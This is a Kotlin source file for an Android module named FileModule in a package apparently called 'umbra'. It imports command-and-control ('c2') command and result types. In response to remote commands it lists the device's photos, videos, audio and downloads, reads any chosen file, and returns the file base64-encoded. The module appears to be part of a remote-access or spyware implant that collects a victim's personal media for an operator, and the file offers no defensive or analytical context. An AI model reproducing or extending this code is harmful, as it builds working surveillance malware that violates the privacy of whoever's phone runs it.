package dev.yassine.umbra.modules

import android.content.Context
import android.database.Cursor
import android.net.Uri
import android.os.Build
import android.provider.MediaStore
import android.util.Base64
import dev.yassine.umbra.c2.Command
import dev.yassine.umbra.c2.CommandResult
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import kotlinx.serialization.encodeToString
import kotlinx.serialization.json.Json
import java.io.ByteArrayOutputStream
import java.io.InputStream

object FileModule {

    private val json = Json { prettyPrint = false }

    suspend fun list(context: Context, cmd: Command): String = withContext(Dispatchers.IO) {
        val type = cmd.params["type"] ?: "images"
        val count = (cmd.params["count"] ?: "50").toIntOrNull() ?: 50

        val uri = when (type) {
            "images" -> MediaStore.Images.Media.EXTERNAL_CONTENT_URI
            "videos" -> MediaStore.Video.Media.EXTERNAL_CONTENT_URI
            "audio"  -> MediaStore.Audio.Media.EXTERNAL_CONTENT_URI
            "downloads" -> MediaStore.Downloads.EXTERNAL_CONTENT_URI
            else -> MediaStore.Images.Media.EXTERNAL_CONTENT_URI
        }

        val projection = arrayOf(
            MediaStore.MediaColumns._ID,
            MediaStore.MediaColumns.DISPLAY_NAME,
            MediaStore.MediaColumns.SIZE,
            MediaStore.MediaColumns.DATE_ADDED,
            MediaStore.MediaColumns.RELATIVE_PATH
        )

        val cursor: Cursor? = context.contentResolver.query(
            uri, projection, null, null,
            "${MediaStore.MediaColumns.DATE_ADDED} DESC"
        )

        val files = mutableListOf<Map<String, String>>()
        cursor?.use {
            val idCol = it.getColumnIndexOrThrow(MediaStore.MediaColumns._ID)
            val nameCol = it.getColumnIndexOrThrow(MediaStore.MediaColumns.DISPLAY_NAME)
            val sizeCol = it.getColumnIndexOrThrow(MediaStore.MediaColumns.SIZE)
            val dateCol = it.getColumnIndexOrThrow(MediaStore.MediaColumns.DATE_ADDED)
            val pathCol = it.getColumnIndexOrThrow(MediaStore.MediaColumns.RELATIVE_PATH)

            var i = 0
            while (it.moveToNext() && i < count) {
                files.add(mapOf(
                    "id" to it.getLong(idCol).toString(),
                    "name" to it.getString(nameCol),
                    "size" to it.getLong(sizeCol).toString(),
                    "date" to it.getLong(dateCol).toString(),
                    "path" to (it.getString(pathCol) ?: "")
                ))
                i++
            }
        }

        val data = json.encodeToString(files)
        json.encodeToString(CommandResult.serializer(), CommandResult(cmd.cmd_id, "ok", data))
    }

    suspend fun read(context: Context, cmd: Command): String = withContext(Dispatchers.IO) {
        val fileId = cmd.params["id"]?.toLongOrNull()
        val fileType = cmd.params["type"] ?: "images"

        if (fileId == null) {
            return@withContext json.encodeToString(CommandResult.serializer(),
                CommandResult(cmd.cmd_id, "error", "", "missing_id"))
        }

        val uri = when (fileType) {
            "images" -> MediaStore.Images.Media.EXTERNAL_CONTENT_URI
            "videos" -> MediaStore.Video.Media.EXTERNAL_CONTENT_URI
            "audio"  -> MediaStore.Audio.Media.EXTERNAL_CONTENT_URI
            else -> MediaStore.Images.Media.EXTERNAL_CONTENT_URI
        }

        val contentUri = Uri.withAppendedPath(uri, fileId.toString())

        try {
            val input: InputStream? = context.contentResolver.openInputStream(contentUri)
            val bytes = input?.use { it.readBytes() } ?: ByteArray(0)
            val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)

            json.encodeToString(CommandResult.serializer(),
                CommandResult(cmd.cmd_id, "ok", b64))
        } catch (e: Exception) {
            json.encodeToString(CommandResult.serializer(),
                CommandResult(cmd.cmd_id, "error", "", "read:${e.message}"))
        }
    }
}
